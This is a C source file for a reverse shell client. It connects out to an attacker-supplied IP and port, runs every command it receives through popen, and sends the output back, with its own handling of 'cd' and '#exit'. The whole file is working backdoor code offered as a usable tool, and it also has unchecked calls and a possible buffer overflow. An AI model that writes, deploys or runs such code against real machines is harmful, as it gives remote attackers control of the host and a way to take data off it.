#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdlib.h>
#include <ctype.h>


int check_args(int argc, char *argv[]) {
    // Checks args, if all is good returns 1, if there are issues returns 0
    int show_help = 0;  // 1 means -h or --help is in args, or no or not enough arguments where given
    for (int i = 1; i < argc; i++) {  // Check if -h or --help is in the arguments
        if(strncmp(argv[i], "-h", strlen("-h")) == 0) {
            show_help = 1;
            break;
        } else if(strncmp(argv[i], "--help", strlen("--help")) == 0) {
            show_help = 1;
            break;
        }
    }
    // Making sure the right amount of arguments were given
    if(argc != 3) {
        show_help = 1;
    }
    // If we need to show the help menu
    if(show_help == 1) {
        printf("usage:\n\t./client SERVER-IP SERVER-PORT\n");
        printf("\t./client -h (show this help menu)\n");
        printf("\t./client --help (show this help menu)\n");
        return 0;
    }
    return 1;
}


void trimLeadingWhiteSpace(char *server_command, char *trimmed_server_command) {
    // gets the command sent from the server as server_command, and writes it without leading white spaces to trimmed_server_command

    int idx = 0, j, k = 0;
    // Iterate String until last leading space character
    while (server_command[idx] == ' ' || server_command[idx] == '\t' || server_command[idx] == '\n')
    {
        idx++;
    }
    for (j = idx; server_command[j] != '\0'; j++)
    {
        trimmed_server_command[k] = server_command[j];
        k++;
    }
    // Insert a string terminating character at the end of new string
    trimmed_server_command[k] = '\0';
}


int main(int argc, char *argv[]) {

    int check_args_result = check_args(argc, argv);
    if(check_args_result == 0) {
        return 0;
    }
    // converting port to a integer type for the socket
    int port = atoi(argv[2]);  
    
    // create the socket
    int client_socket = socket(AF_INET, SOCK_STREAM, 0);

    // set server details
    struct sockaddr_in server_address;
    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(port);
    server_address.sin_addr.s_addr = inet_addr(argv[1]);

    // trying to connect to server
    int connection_status = connect(client_socket, (struct sockaddr*) &server_address, sizeof(server_address));
    // checking if connection worked
    if (connection_status == -1) {
        printf("[-] couldn't connect to server\n");
        return 0;
    }

    // enter loop to recieve commands and execute them
    char server_command[1024];  // stores the raw command sent from the server
    char trimmed_server_command[1024];  // stores the command sent from the server after its leading white space has been trimmed
    char partial_command_output[1024];  // stores part of the output and adds it to full_command_output
    char full_command_output[18384];  // stores the full final output of the command that was executed

    while (1)
    {
        memset(server_command, 0, sizeof(server_command));
        memset(trimmed_server_command, 0, sizeof(trimmed_server_command));
        memset(partial_command_output, 0, sizeof(partial_command_output));
        memset(full_command_output, 0, sizeof(full_command_output));
        
        recv(client_socket, server_command, sizeof(server_command), 0);

        // trimming leading whitespace from command
        trimLeadingWhiteSpace(server_command, trimmed_server_command);

        // checking for special custom shell commands
        if (strncmp("#exit", trimmed_server_command, 5) == 0 ) {
            // close client socket
            close(client_socket);
            exit(0);
        }

        // if the command is 'cd' and we want to change directories
        if (strncmp("cd ", trimmed_server_command, 3) == 0) {
            // remove 'cd ' from the stripped command
            memmove(trimmed_server_command, trimmed_server_command + 3, strlen(trimmed_server_command) - 3 + 1);
            chdir(trimmed_server_command);  // change directory
            // sending success message back to server
            // send(client_socket, "moved directory", sizeof("moved directory"), 0);
            continue;
        }

        // executing raw command received from server and reading the output to full_command_output variable
        FILE *fp;
        fp = popen(server_command, "r");
        while (fgets(partial_command_output, 1024, fp) != NULL)
        {
            strcat(full_command_output, partial_command_output);
        }
        // sending full command output back to server
        send(client_socket, full_command_output, sizeof(full_command_output), 0);
        // closing the file descriptor we made for the command
        fclose(fp);
    }

    // close client socket
    close(client_socket);

    return 0;
}